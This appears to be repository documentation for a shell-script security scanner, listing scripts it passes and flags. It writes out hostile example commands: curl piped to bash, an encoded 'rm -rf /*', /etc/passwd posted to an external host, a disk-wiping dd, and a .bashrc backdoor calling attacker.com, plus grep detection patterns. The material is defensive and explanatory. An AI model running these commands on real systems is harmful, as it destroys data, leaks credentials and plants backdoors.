# Shell Script Security Scanner - Test Examples

This document provides examples of what the security scanner detects.

## ✅ Safe Script Example

This script would pass all security checks:

```bash
#!/bin/bash
set -euo pipefail

# Safe script that captures images
IMAGE_DIR="/home/birdhouse/captures"
TIMESTAMP=$(date '+%Y%m%d_%H%M%S')
IMAGE_FILE="${IMAGE_DIR}/bird_${TIMESTAMP}.jpg"

# Validate directory exists
if [[ ! -d "$IMAGE_DIR" ]]; then
    echo "Error: Image directory does not exist"
    exit 1
fi

# Capture image with picamera2
python3 /home/birdhouse/capture.py --output "$IMAGE_FILE"

echo "Image saved: $IMAGE_FILE"
```

**Why it passes:**
- Uses `set -euo pipefail` for error handling
- Quotes all variables properly
- No remote code execution
- No suspicious patterns
- Clear, legitimate purpose

---

## ⚠️ Scripts That Would Trigger Warnings

### Example 1: Remote Code Execution

```bash
#!/bin/bash
# This would FAIL the security scan

curl -s https://install.example.com/setup.sh | bash
```

**Detected patterns:**
- ❌ Remote code execution (piping to bash)
- ❌ Suspicious download (curl -s)

**Why it's dangerous:**
- Downloads and executes code without review
- No verification of source integrity
- Could be compromised or malicious

**Safe alternative:**
```bash
#!/bin/bash
# Download, verify, then run

wget https://install.example.com/setup.sh
wget https://install.example.com/setup.sh.sha256

# Verify checksum
sha256sum -c setup.sh.sha256

# Review the script first
less setup.sh

# If safe, run it
bash setup.sh
```

---

### Example 2: Base64 Encoded Commands

```bash
#!/bin/bash
# This would FAIL the security scan

echo "cm0gLXJmIC8qCg==" | base64 -d | sh
```

**Detected patterns:**
- ❌ Base64 encoded commands

**Why it's dangerous:**
- Hides the actual command being executed
- Commonly used to obfuscate malicious code
- The decoded command is `rm -rf /*` (deletes everything)

**Safe alternative:**
- Don't use base64 for commands
- Write commands explicitly
- If you need to encode data, use it for data only, not execution

---

### Example 3: Data Exfiltration

```bash
#!/bin/bash
# This would FAIL the security scan

# Collect system info and send to external server
cat /etc/passwd | curl -X POST -d @- https://collector.example.com/data
```

**Detected patterns:**
- ❌ Data exfiltration (curl -X POST)
- ❌ Credential theft (accessing /etc/passwd)

**Why it's dangerous:**
- Sends sensitive data to external servers
- Could expose user accounts
- Unauthorized data transmission

---

### Example 4: System Modification

```bash
#!/bin/bash
# This would FAIL the security scan

# Dangerous system modification
dd if=/dev/zero of=/dev/sda bs=1M
```

**Detected patterns:**
- ❌ System modification (dd)

**Why it's dangerous:**
- Could destroy filesystem
- Could overwrite system disk
- Irreversible damage

---

### Example 5: Persistence Mechanism

```bash
#!/bin/bash
# This would FAIL the security scan

# Add backdoor to user's shell initialization
echo "curl -s https://attacker.com/backdoor.sh | bash" >> ~/.bashrc
```

**Detected patterns:**
- ❌ Persistence mechanism (.bashrc)
- ❌ Remote code execution

**Why it's dangerous:**
- Creates persistent backdoor
- Runs malicious code on every shell startup
- Hard to detect and remove

---

## 🔍 False Positives

Some legitimate scripts may trigger warnings. These should be reviewed and approved:

### Example: SSH Key Usage (False Positive)

```bash
#!/bin/bash
# This would trigger a WARNING but is SAFE

# Transfer file via SSH (legitimate use)
scp -i ~/.ssh/birdhouse_key image.jpg user@server:/backup/
```

**Detected pattern:**
- ⚠️ Credential theft (.ssh)

**Why it's actually safe:**
- Legitimate use of SSH keys for authentication
- Not accessing credentials maliciously
- Standard practice for secure file transfer

**What to do:**
- Reviewer should approve this as a false positive
- Add a comment in the PR explaining the legitimate use

---

## Testing the Scanner Locally

You can test the scanner on your scripts before submitting a PR:

### 1. Run ShellCheck

```bash
shellcheck your-script.sh
```

### 2. Test Malicious Pattern Detection

Create this test script:

```bash
#!/bin/bash

# Test your script against security patterns
grep -E "curl.*\|.*bash|wget.*\|.*sh" your-script.sh && echo "⚠️ Remote execution detected"
grep -E "base64 -d.*\|" your-script.sh && echo "⚠️ Base64 commands detected"
grep -E "curl.*-X POST.*http" your-script.sh && echo "⚠️ Data exfiltration detected"

echo "✅ Manual scan complete"
```

---

## Summary

The security scanner helps protect the repository by detecting:

✅ **Always Bad:**
- Remote code execution without verification
- Base64 encoded commands
- Data exfiltration to external servers
- Dangerous system modifications
- Hidden backdoors

⚠️ **Sometimes False Positives:**
- SSH key usage for authentication
- Legitimate use of curl/wget
- System administration commands
- Environment variable access

**Remember:** The scanner is a tool to assist review, not replace it. Always manually review flagged code to determine if it's legitimate or malicious.
